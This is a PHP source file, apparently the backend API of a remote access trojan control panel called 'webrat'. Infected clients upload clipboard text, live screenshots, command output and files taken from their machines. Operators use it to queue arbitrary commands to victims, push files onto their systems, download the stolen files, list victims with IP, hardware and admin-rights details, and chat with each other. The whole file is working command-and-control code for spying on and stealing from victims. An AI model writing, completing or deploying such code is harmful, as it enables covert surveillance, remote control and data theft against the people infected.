            $stmt = $db->prepare('INSERT INTO clipboards (client_id, text) VALUES (?, ?)');
            $stmt->execute([$clientId, $text]);
            jsonOk([], 'CLIPBOARD_SAVED');
        } catch (Exception $e) {
            jsonErr('CLIPBOARD_ERROR', 500);
        }
        break;

    case 'upload_screenshot':
        requireApiKey();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        $hwid     = trim($data['hwid'] ?? '');
        $imgB64   = $data['image'] ?? '';
        $width    = (int)($data['width'] ?? 0);
        $height   = (int)($data['height'] ?? 0);
        if ($clientId === '' || $imgB64 === '') jsonErr('MISSING_DATA');
        try {
            $db->prepare("
                INSERT INTO screenshots_live (client_id, hwid, image_b64, width, height, captured_at)
                VALUES (?, ?, ?, ?, ?, NOW())
                ON DUPLICATE KEY UPDATE hwid=VALUES(hwid), image_b64=VALUES(image_b64),
                    width=VALUES(width), height=VALUES(height), captured_at=NOW()
            ")->execute([$clientId, $hwid, $imgB64, $width, $height]);
            jsonOk([], 'SCREENSHOT_SAVED');
        } catch (Exception $e) {
            jsonErr('SCREENSHOT_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'get_screenshot':
        requireDashboardAuth();
        $clientId = trim($_GET['client_id'] ?? '');
        if ($clientId === '') jsonErr('MISSING_CLIENT_ID');
        try {
            $stmt = $db->prepare("SELECT image_b64, width, height, captured_at FROM screenshots_live WHERE client_id = ? LIMIT 1");
            $stmt->execute([$clientId]);
            $row = $stmt->fetch();
            if ($row) {
                jsonOk([
                    'image'       => $row['image_b64'],
                    'width'       => $row['width'],
                    'height'      => $row['height'],
                    'captured_at' => $row['captured_at'],
                ]);
            } else {
                jsonOk(['image' => null]);
            }
        } catch (Exception $e) {
            jsonErr('GET_SCREENSHOT_ERROR', 500);
        }
        break;
    case 'command_result':
        requireApiKey();
        $data = getJsonBody();
        $cmdId  = (int)($data['command_id'] ?? 0);
        $result = $data['result'] ?? '';
        $status = ($data['error'] ?? false) ? 'error' : 'done';

        if ($cmdId <= 0) jsonErr('MISSING_COMMAND_ID');

        try {
            $db->prepare('UPDATE commands SET result = ?, status = ?, executed_at = NOW() WHERE id = ?')->execute([$result, $status, $cmdId]);
            jsonOk([], 'COMMAND_UPDATED');
        } catch (Exception $e) {
            jsonErr('COMMAND_UPDATE_ERROR', 500);
        }
        break;

    case 'clients':
        requireDashboardAuth();
        try {
            $db->exec("UPDATE clients SET status = CASE WHEN (last_ping >= NOW() - INTERVAL 5 MINUTE OR last_active >= NOW() - INTERVAL 5 MINUTE) THEN 'online' WHEN (last_ping >= NOW() - INTERVAL 15 MINUTE OR last_active >= NOW() - INTERVAL 15 MINUTE) THEN 'recent' ELSE 'away' END");
            $rows = $db->query('SELECT * FROM clients ORDER BY id DESC')->fetchAll(PDO::FETCH_ASSOC);
            $clients = [];
            foreach ($rows as $r) {
                $clients[] = [
                    'id'          => $r['client_id'] ?? '',
                    'hwid'        => $r['hwid'] ?? '',
                    'loc'         => $r['loc'] ?? '',
                    'user'        => $r['username'] ?? '',
                    'pcname'      => $r['pcname'] ?? '',
                    'ip'          => $r['ip'] ?? '',
                    'ping'        => timeAgo($r['last_ping'] ?? null),
                    'status'      => $r['status'] ?? 'away',
                    'active'      => $r['active_window'] ?? '',
                    'asn'         => $r['asn'] ?? '',
                    'hosting'     => (bool)($r['hosting'] ?? 0),
                    'system'      => $r['system_info'] ?? '',
                    'lastActive'  => !empty($r['last_active']) ? date('d.m.Y, H:i:s', strtotime($r['last_active'])) : '',
                    'debut'       => !empty($r['debut']) ? date('d.m.Y, H:i:s', strtotime($r['debut'])) : '',
                    'adminRights' => (bool)($r['admin_rights'] ?? 0),
                    'cpu'         => $r['cpu'] ?? '',
                    'gpu'         => $r['gpu'] ?? '',
                    'ram'         => $r['ram'] ?? '',
                    'disk'        => $r['disk'] ?? '',
                    'onlineH'     => (int)($r['online_hours'] ?? 0),
                    'totalH'      => (int)($r['total_hours'] ?? 0),
                ];
            }
            jsonOk($clients);
        } catch (Exception $e) { jsonErr('FETCH_CLIENTS_ERROR: ' . $e->getMessage(), 500); }
        break;

    case 'stats':
        requireDashboardAuth();
        try {
            $onlineCount = (int)$db->query("SELECT COUNT(*) FROM clients WHERE last_ping >= NOW() - INTERVAL 5 MINUTE")->fetchColumn();
            $totalCount  = (int)$db->query("SELECT COUNT(*) FROM clients")->fetchColumn();
            $locsStmt    = $db->query("SELECT DISTINCT loc FROM clients WHERE loc != ''");
            $locs        = $locsStmt ? $locsStmt->fetchAll(PDO::FETCH_COLUMN) : [];
            $keylogsToday = (int)$db->query("SELECT COUNT(*) FROM keylogs WHERE DATE(captured_at) = CURDATE()")->fetchColumn();

            jsonOk([
                'online_clients'    => $onlineCount,
                'total_clients'     => $totalCount,
                'locations'         => $locs,
                'locations_count'   => count($locs),
                'keylogs_today'     => $keylogsToday,
                'screenshots_today' => 0
            ]);
        } catch (Exception $e) {
            jsonErr('STATS_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'clipboards':
        requireDashboardAuth();
        $clientId = trim($_GET['client_id'] ?? '');
        try {
            if ($clientId !== '') {
                $stmt = $db->prepare("SELECT * FROM clipboards WHERE client_id = ? ORDER BY captured_at DESC LIMIT 100");
                $stmt->execute([$clientId]);
            } else {
                $stmt = $db->query("SELECT * FROM clipboards ORDER BY captured_at DESC LIMIT 100");
            }
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            jsonOk($rows);
        } catch (Exception $e) { jsonErr('CLIPBOARDS_FETCH_ERROR', 500); }
        break;

    case 'send_command':
        requireDashboardAuth();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        $cmd      = trim($data['command'] ?? '');
        if ($clientId === '' || $cmd === '') jsonErr('MISSING_DATA');
        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $cmd]);
            $cmdId = $db->lastInsertId();
            jsonOk(['command_id' => $cmdId], 'COMMAND_QUEUED');
        } catch (Exception $e) { jsonErr('COMMAND_SEND_ERROR', 500); }
        break;

    case 'command_history':
        requireDashboardAuth();
        $clientId = trim($_GET['client_id'] ?? '');
        try {
            $stmt = $db->prepare("SELECT * FROM commands WHERE client_id = ? ORDER BY created_at DESC LIMIT 50");
            $stmt->execute([$clientId]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            jsonOk($rows);
        } catch (Exception $e) { jsonErr('COMMAND_HISTORY_ERROR', 500); }
        break;

    case 'get_user_profile':
        requireDashboardAuth();
        $user = trim($_GET['username'] ?? '');
        if ($user === '') $user = $_SESSION['webrat_user'] ?? 'Admin';
        try {
            // Truy xuất CSDL 2 (ctpzfsyl_Khoaxhoang) không phân biệt hoa thường
            $stmt = $db->prepare("
                SELECT username, nickname, avatar, bio, cover, admin_rights, created_at, profile_color_top, profile_color_bottom, avatar_deco_url, avatar_deco_settings
                FROM `accounts` WHERE LOWER(`username`) = LOWER(?) LIMIT 1
            ");
            $stmt->execute([$user]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && is_array($row)) {
                $rights = (int)($row['admin_rights'] ?? 0);
                jsonOk([
                    'username'              => $row['username'] ?? $user,
                    'nickname'              => (isset($row['nickname']) && $row['nickname'] !== null && $row['nickname'] !== '') ? $row['nickname'] : $user,
                    'avatar'                => $row['avatar']                ?? null,
                    'bio'                   => $row['bio']                   ?? null,
                    'cover'                 => $row['cover']                 ?? null,
                    'admin_rights'          => $rights,
                    'role_name'             => getRoleName($rights),
                    'created_at'            => $row['created_at']            ?? null,
                    'profile_color_top'     => $row['profile_color_top']     ?? null,
                    'profile_color_bottom'  => $row['profile_color_bottom']  ?? null,
                    'avatar_deco_url'       => $row['avatar_deco_url']       ?? null,
                    'avatar_deco_settings'  => $row['avatar_deco_settings']  ?? null,
                ]);
            } else {
                jsonOk([
                    'username'              => $user,
                    'nickname'              => $user,
                    'avatar'                => null,
                    'bio'                   => null,
                    'cover'                 => null,
                    'admin_rights'          => 0,
                    'role_name'             => 'member',
                    'created_at'            => null,
                    'profile_color_top'     => null,
                    'profile_color_bottom'  => null,
                    'avatar_deco_url'       => null,
                    'avatar_deco_settings'  => null,
                ]);
            }
        } catch (Throwable $e) {
            jsonOk([
                'username'              => $user,
                'nickname'              => $user,
                'avatar'                => null,
                'bio'                   => null,
                'cover'                 => null,
                'admin_rights'          => 0,
                'role_name'             => 'member',
                'profile_color_top'     => null,
                'profile_color_bottom'  => null,
                'avatar_deco_url'       => null,
                'avatar_deco_settings'  => null,
                'error_debug'           => $e->getMessage(),
            ]);
        }
        break;

    case 'get_deco_presets':
        requireDashboardAuth();
        try {
            $rows = $db->query("SELECT id, name, url, sort_order FROM `deco_presets` WHERE is_active = 1 ORDER BY sort_order ASC, id ASC")->fetchAll(PDO::FETCH_ASSOC);
            jsonOk($rows);
        } catch (Exception $e) { jsonErr('DECO_PRESETS_ERROR: ' . $e->getMessage(), 500); }
        break;

    case 'add_deco_preset':
        requireDashboardAuth();
        // Admin only
        $me = $_SESSION['webrat_user'];
        $meRow = $db->prepare("SELECT admin_rights FROM accounts WHERE username = ? LIMIT 1");
        $meRow->execute([$me]);
        $meData = $meRow->fetch();
        if (!$meData || (int)$meData['admin_rights'] < 1) jsonErr('FORBIDDEN', 403);
        $data = getJsonBody();
        $name = trim($data['name'] ?? '');
        $url  = trim($data['url']  ?? '');
        $sort = (int)($data['sort_order'] ?? 0);
        if ($name === '' || $url === '') jsonErr('MISSING_FIELDS');
        if (!preg_match('#^https?://#i', $url)) jsonErr('INVALID_URL');
        try {
            $stmt = $db->prepare("INSERT INTO `deco_presets` (name, url, sort_order) VALUES (?, ?, ?)");
            $stmt->execute([$name, $url, $sort]);
            jsonOk(['id' => $db->lastInsertId()], 'PRESET_ADDED');
        } catch (Exception $e) { jsonErr('ADD_PRESET_ERROR: ' . $e->getMessage(), 500); }
        break;

    case 'delete_deco_preset':
        requireDashboardAuth();
        $me = $_SESSION['webrat_user'];
        $meRow = $db->prepare("SELECT admin_rights FROM accounts WHERE username = ? LIMIT 1");
        $meRow->execute([$me]);
        $meData = $meRow->fetch();
        if (!$meData || (int)$meData['admin_rights'] < 1) jsonErr('FORBIDDEN', 403);
        $data = getJsonBody();
        $id   = (int)($data['id'] ?? 0);
        if ($id <= 0) jsonErr('MISSING_ID');
        try {
            $db->prepare("UPDATE `deco_presets` SET is_active = 0 WHERE id = ?")->execute([$id]);
            jsonOk([], 'PRESET_DELETED');
        } catch (Exception $e) { jsonErr('DELETE_PRESET_ERROR: ' . $e->getMessage(), 500); }
        break;

    case 'get_profile':
        requireDashboardAuth();
        $user = $_SESSION['webrat_user'];
        try {
            $stmt = $db->prepare("SELECT nickname, avatar, bio, cover, admin_rights, created_at, profile_color_top, profile_color_bottom, avatar_deco_url, avatar_deco_settings FROM accounts WHERE username = ? LIMIT 1");
            $stmt->execute([$user]);
            $row = $stmt->fetch();
            $rights = (int)($row['admin_rights'] ?? 0);
            jsonOk([
                'nickname'              => $row['nickname']              ?? null,
                'avatar'                => $row['avatar']                ?? null,
                'bio'                   => $row['bio']                   ?? null,
                'cover'                 => $row['cover']                 ?? null,
                'admin_rights'          => $rights,
                'role_name'             => getRoleName($rights),
                'created_at'            => $row['created_at']            ?? null,
                'profile_color_top'     => $row['profile_color_top']     ?? null,
                'profile_color_bottom'  => $row['profile_color_bottom']  ?? null,
                'avatar_deco_url'       => $row['avatar_deco_url']       ?? null,
                'avatar_deco_settings'  => $row['avatar_deco_settings']  ?? null,
            ]);
        } catch (Exception $e) {
            jsonErr('GET_PROFILE_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'save_profile':
        requireDashboardAuth();
        $user = $_SESSION['webrat_user'];
        $data = getJsonBody();
        // Only update fields explicitly included in the request
        $sets = []; $vals = [];
        if (array_key_exists('nickname', $data)) {
            $nickname = $data['nickname'] !== null ? trim($data['nickname']) : null;
            if ($nickname !== null && mb_strlen($nickname) > 30) jsonErr('NICKNAME_TOO_LONG');
            $sets[] = '`nickname` = ?';
            $vals[] = $nickname ?: null;
        }
        if (array_key_exists('bio', $data)) {
            $bio = $data['bio'] !== null ? trim($data['bio']) : null;
            if ($bio !== null && mb_strlen($bio) > 300) jsonErr('BIO_TOO_LONG');
            $sets[] = '`bio` = ?';
            $vals[] = $bio ?: null;
        }
        if (array_key_exists('avatar', $data) && $data['avatar'] !== null) {
            $sets[] = '`avatar` = ?';
            $vals[] = $data['avatar'] === '' ? null : $data['avatar'];
        } elseif (!empty($data['remove_avatar'])) {
            $sets[] = '`avatar` = NULL';
        }
        if (array_key_exists('cover', $data) && $data['cover'] !== null) {
            $sets[] = '`cover` = ?';
            $vals[] = $data['cover'] === '' ? null : $data['cover'];
        } elseif (!empty($data['remove_cover'])) {
            $sets[] = '`cover` = NULL';
        }
        if (array_key_exists('profile_color_top', $data)) {
            $colorTop = $data['profile_color_top'];
            if ($colorTop !== null && !preg_match('/^#[0-9a-fA-F]{6}$/', $colorTop)) jsonErr('INVALID_COLOR_TOP');
            $sets[] = '`profile_color_top` = ?';
            $vals[] = $colorTop ?: null;
        }
        if (array_key_exists('profile_color_bottom', $data)) {
            $colorBottom = $data['profile_color_bottom'];
            if ($colorBottom !== null && !preg_match('/^#[0-9a-fA-F]{6}$/', $colorBottom)) jsonErr('INVALID_COLOR_BOTTOM');
            $sets[] = '`profile_color_bottom` = ?';
            $vals[] = $colorBottom ?: null;
        }
        if (array_key_exists('avatar_deco_url', $data)) {
            $decoUrl = $data['avatar_deco_url'] !== null ? trim($data['avatar_deco_url']) : null;
            if ($decoUrl !== null && mb_strlen($decoUrl) > 500) jsonErr('DECO_URL_TOO_LONG');
            // Only allow http/https URLs or empty/null
            if ($decoUrl !== null && $decoUrl !== '' && !preg_match('#^https?://#i', $decoUrl)) jsonErr('INVALID_DECO_URL');
            $sets[] = '`avatar_deco_url` = ?';
            $vals[] = ($decoUrl !== '') ? $decoUrl : null;
        }
        if (array_key_exists('avatar_deco_settings', $data)) {
            $decoSettings = $data['avatar_deco_settings'];
            if ($decoSettings !== null && mb_strlen($decoSettings) > 200) jsonErr('DECO_SETTINGS_TOO_LONG');
            $sets[] = '`avatar_deco_settings` = ?';
            $vals[] = $decoSettings ?: null;
        }

        if (empty($sets)) jsonErr('NOTHING_TO_SAVE');
        try {
            // Tự động kiểm tra và tạo bản ghi tài khoản trên Database 2 nếu chưa tồn tại
            $checkStmt = $db->prepare("SELECT id FROM `accounts` WHERE `username` = ? LIMIT 1");
            $checkStmt->execute([$user]);
            if (!$checkStmt->fetch()) {
                $db->prepare("INSERT INTO `accounts` (`username`, `password_hash`, `is_active`) VALUES (?, '', 1)")
                   ->execute([$user]);
            }

            $vals[] = $user;
            $db->prepare("UPDATE `accounts` SET " . implode(', ', $sets) . " WHERE `username` = ?")
               ->execute($vals);
            jsonOk([], 'PROFILE_SAVED');
        } catch (Exception $e) {
            jsonErr('SAVE_PROFILE_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'ping':
        requireDashboardAuth();
        try {
            $db->prepare("UPDATE accounts SET last_seen = NOW() WHERE username = ?")
               ->execute([$_SESSION['webrat_user']]);
        } catch (Exception $e) {}
        jsonOk(['pong' => true]);
        break;

    case 'get_chat':
        requireDashboardAuth();
        // Update last_seen — this action is polled every 3s so it accurately tracks active chat users
        try {
            $db->prepare("UPDATE accounts SET last_seen = NOW() WHERE username = ?")
               ->execute([$_SESSION['webrat_user']]);
        } catch (Exception $e) {}
        $since = (int)($_GET['since'] ?? 0);
        try {
            if ($since > 0) {
                $stmt = $db->prepare("
                    SELECT c.id, c.sender, c.message, c.type, c.media, c.sent_at,
                           a.nickname, a.avatar, a.avatar_deco_url, a.avatar_deco_settings
                    FROM admin_chat c
                    LEFT JOIN accounts a ON a.username = c.sender
                    WHERE c.id > ?
                    ORDER BY c.id ASC LIMIT 100
                ");
                $stmt->execute([$since]);
            } else {
                $stmt = $db->query("
                    SELECT c.id, c.sender, c.message, c.type, c.media, c.sent_at,
                           a.nickname, a.avatar, a.avatar_deco_url, a.avatar_deco_settings
                    FROM admin_chat c
                    LEFT JOIN accounts a ON a.username = c.sender
                    ORDER BY c.id DESC LIMIT 100
                ");
                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
                jsonOk(array_reverse($rows));
                exit;
            }
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            jsonOk($rows);
        } catch (Exception $e) {
            jsonErr('CHAT_FETCH_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'send_chat':
        requireDashboardAuth();
        // Update last_seen on send too
        try {
            $db->prepare("UPDATE accounts SET last_seen = NOW() WHERE username = ?")
               ->execute([$_SESSION['webrat_user']]);
        } catch (Exception $e) {}
        $sender  = $_SESSION['webrat_user'] ?? '';
        $data    = getJsonBody();
        $message = trim($data['message'] ?? '');
        $type    = in_array($data['type'] ?? 'text', ['text','image','video','voice']) ? ($data['type'] ?? 'text') : 'text';
        $media   = $data['media'] ?? null; // base64 string or null
        if ($message === '' && $media === null) jsonErr('MISSING_CONTENT');
        if ($type === 'text' && mb_strlen($message) > 2000) jsonErr('MESSAGE_TOO_LONG');
        try {
            $stmt = $db->prepare("INSERT INTO admin_chat (sender, message, type, media) VALUES (?, ?, ?, ?)");
            $stmt->execute([$sender, $message, $type, $media]);
            $newId = $db->lastInsertId();
            jsonOk(['id' => $newId], 'MESSAGE_SENT');
        } catch (Exception $e) {
            jsonErr('CHAT_SEND_ERROR: ' . $e->getMessage(), 500);
        }
        break;
    // ─── SAVE UPLOAD FILE (lưu file base64 lên DB1 để client.py nhận) ─────────────
    case 'save_upload_file':
        requireDashboardAuth();
        $data = getJsonBody();
        $fileName = trim($data['filename'] ?? '');
        $fileData = $data['filedata'] ?? '';
        $destPath = trim($data['destpath'] ?? 'C:\\');
        $clientId = trim($data['client_id'] ?? '');
        $hwid     = trim($data['hwid'] ?? '');
        if ($fileName === '' || $fileData === '') jsonErr('MISSING_FILE_DATA');
        try {
            $db->exec("CREATE TABLE IF NOT EXISTS `uploaded_files` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `client_id` VARCHAR(20) NOT NULL,
              `hwid` VARCHAR(64) DEFAULT '',
              `filename` VARCHAR(255) NOT NULL,
              `destpath` VARCHAR(500) NOT NULL,
              `filedata` LONGTEXT NOT NULL,
              `status` ENUM('pending','done','error') DEFAULT 'pending',
              `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
            $cleanHwid = ltrim($hwid, '#');
            $stmt = $db->prepare("INSERT INTO `uploaded_files` (client_id, hwid, filename, destpath, filedata, status) VALUES (?, ?, ?, ?, ?, 'pending')");
            $stmt->execute([$clientId, $cleanHwid, $fileName, $destPath, $fileData]);
            $fileId = $db->lastInsertId();
            jsonOk(['file_id' => $fileId, 'filename' => $fileName, 'destpath' => $destPath], 'FILE_SAVED');
        } catch (Exception $e) {
            jsonErr('SAVE_FILE_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // ─── GET UPLOADED FILE (client.py tải file từ DB1) ────────────────────────────
    case 'get_upload_file':
        requireApiKey();
        $fileId = (int)($_GET['file_id'] ?? $_POST['file_id'] ?? 0);
        if ($fileId <= 0) jsonErr('MISSING_FILE_ID');
        try {
            $db->exec("CREATE TABLE IF NOT EXISTS `uploaded_files` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `client_id` VARCHAR(20) NOT NULL,
              `hwid` VARCHAR(64) DEFAULT '',
              `filename` VARCHAR(255) NOT NULL,
              `destpath` VARCHAR(500) NOT NULL,
              `filedata` LONGTEXT NOT NULL,
              `status` ENUM('pending','done','error') DEFAULT 'pending',
              `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
            $stmt = $db->prepare("SELECT filename, destpath, filedata FROM `uploaded_files` WHERE id = ? LIMIT 1");
            $stmt->execute([$fileId]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if (!$row) jsonErr('FILE_NOT_FOUND', 404);
            $db->prepare("UPDATE `uploaded_files` SET status='done' WHERE id=?")->execute([$fileId]);
            jsonOk(['filename' => $row['filename'], 'destpath' => $row['destpath'], 'filedata' => $row['filedata']], 'FILE_FETCHED');
        } catch (Exception $e) {
            jsonErr('GET_FILE_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // ─── SAVE DOWNLOADED FILE (client.py gửi dữ liệu tệp vừa đọc lên DB1) ──────────
    case 'save_downloaded_file':
        requireApiKey();
        $data     = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        $hwid     = trim($data['hwid'] ?? '');
        $fileName = trim($data['filename'] ?? '');
        $filePath = trim($data['filepath'] ?? '');
        $fileData = $data['filedata'] ?? ''; // base64 string

        if ($clientId === '' || $fileName === '' || $fileData === '') {
            jsonErr('MISSING_DOWNLOAD_DATA');
        }

        try {
            $db->exec("CREATE TABLE IF NOT EXISTS `downloaded_files` (
              `id`          INT AUTO_INCREMENT PRIMARY KEY,
              `client_id`   VARCHAR(20) NOT NULL,
              `hwid`        VARCHAR(64) DEFAULT '',
              `filename`    VARCHAR(255) NOT NULL,
              `filepath`    VARCHAR(500) NOT NULL,
              `filedata`    LONGTEXT NOT NULL,
              `created_at`  DATETIME DEFAULT CURRENT_TIMESTAMP,
              INDEX idx_client_down (`client_id`, `hwid`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

            $cleanHwid = ltrim($hwid, '#');
            $stmt = $db->prepare("INSERT INTO `downloaded_files` (client_id, hwid, filename, filepath, filedata) VALUES (?, ?, ?, ?, ?)");
            $stmt->execute([$clientId, $cleanHwid, $fileName, $filePath, $fileData]);
            $downId = $db->lastInsertId();

            jsonOk(['id' => $downId, 'filename' => $fileName], 'DOWNLOAD_SAVED_TO_DB');
        } catch (Exception $e) {
            jsonErr('SAVE_DOWNLOAD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // ─── DOWNLOAD FILE TO BROWSER / COMPUTER (tải file trực tiếp từ DB về máy) ───
    case 'download_file':
    case 'get_download_file_binary':
        requireDashboardAuth();
        $fileId = (int)($_GET['id'] ?? $_POST['id'] ?? $_GET['file_id'] ?? 0);
        if ($fileId <= 0) jsonErr('MISSING_FILE_ID');

        try {
            $stmt = $db->prepare("SELECT filename, filedata FROM `downloaded_files` WHERE id = ? LIMIT 1");
            $stmt->execute([$fileId]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$row) {
                jsonErr('FILE_NOT_FOUND_IN_DB', 404);
            }

            $fileName = basename($row['filename']);
            $rawBytes = base64_decode($row['filedata']);

            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . rawurlencode($fileName) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . strlen($rawBytes));

            echo $rawBytes;
            exit;
        } catch (Exception $e) {
            jsonErr('DOWNLOAD_BINARY_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // ─── GET DOWNLOADED FILES LIST (lấy danh sách file đã lưu để tải về) ───────────
    case 'get_downloaded_files':
        requireDashboardAuth();
        $clientId = trim($_GET['client_id'] ?? $_POST['client_id'] ?? '');
        try {
            $stmt = $db->prepare("SELECT id, client_id, filename, filepath, CHAR_LENGTH(filedata) as b64_len, created_at FROM `downloaded_files` WHERE client_id = ? OR client_id = ? ORDER BY id DESC LIMIT 100");
            $cleanId = ltrim($clientId, '#');
            $stmt->execute([$clientId, '#' . $cleanId]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            jsonOk($rows);
        } catch (Exception $e) {
            jsonErr('GET_DOWNLOADS_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    default:
        jsonErr('UNKNOWN_ACTION', 400);
}
